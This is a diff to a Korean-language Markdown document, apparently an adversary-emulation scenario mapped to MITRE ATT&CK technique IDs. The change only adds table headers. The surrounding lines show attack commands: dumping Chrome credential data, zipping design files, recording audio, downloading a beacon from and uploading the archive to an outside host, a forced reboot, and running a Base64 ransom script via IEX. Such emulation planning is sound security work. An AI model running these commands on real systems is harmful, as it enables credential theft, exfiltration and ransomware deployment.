@@ -69,13 +69,17 @@ powershell -c "Get-PnpDevice -Class USB"
 powershell -ep bypass -c "(Get-ItemProperty -Path 'HKCU:\Software\Google\Chrome\...') > '%TEMP%\chrome_creds.txt'"
 ```
 
-\| 4-2   | T1005 – Data from Local System            | CAD/PDF 도면 검색 및 ZIP 압축 |
+| 순서  | TID                                       | 행위              |
+| --- | ----------------------------------------- | --------------- |
+| 4-2   | T1005 – Data from Local System            | CAD/PDF 도면 검색 및 ZIP 압축 |
 
 ```powershell
 $dir="C:\Projects"; $zip="$env:TEMP\designs.zip"; Compress-Archive -Path $dir\*.pdf,$dir\*.dwg -DestinationPath $zip
 ```
 
-\| 4-3   | T1123 – Audio Capture                     | 회의 녹음 15초                |
+| 순서  | TID                                       | 행위              |
+| --- | ----------------------------------------- | --------------- |
+| 4-3   | T1123 – Audio Capture                     | 회의 녹음 15초                |
 
 ```cmd
 "%ProgramFiles%\AudioRecorder.exe" -out "%TEMP%\meeting.wav" -d 15
@@ -92,8 +96,9 @@ $dir="C:\Projects"; $zip="$env:TEMP\designs.zip"; Compress-Archive -Path $dir\*.
 ```cmd
 bitsadmin /transfer myDownload /download /priority normal "https://cdn.dropzone.net/beacon" "%TEMP%\b.dat"
 ```
-
-\| 5-2   | T1105 – Ingress Tool Transfer     | 설계도 압축본 업로드     |
+| 순서  | TID                                       | 행위              |
+| --- | ----------------------------------------- | --------------- |
+| 5-2   | T1105 – Ingress Tool Transfer     | 설계도 압축본 업로드     |
 
 ```powershell
 Invoke-RestMethod "https://cdn.dropzone.net/upload" -InFile "$env:TEMP\designs.zip"
@@ -111,7 +116,9 @@ Invoke-RestMethod "https://cdn.dropzone.net/upload" -InFile "$env:TEMP\designs.z
 shutdown /r /t 1 /f
 ```
 
-\| 6-2   | T1027 – Obfuscated Files or Information | 랜섬노트 실행 Base64 인젝션 |
+| 순서  | TID                                       | 행위              |
+| --- | ----------------------------------------- | --------------- |
+| 6-2   | T1027 – Obfuscated Files or Information | 랜섬노트 실행 Base64 인젝션 |
 
 ```powershell
 powershell -c "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('base64encodedransomscript==')))"
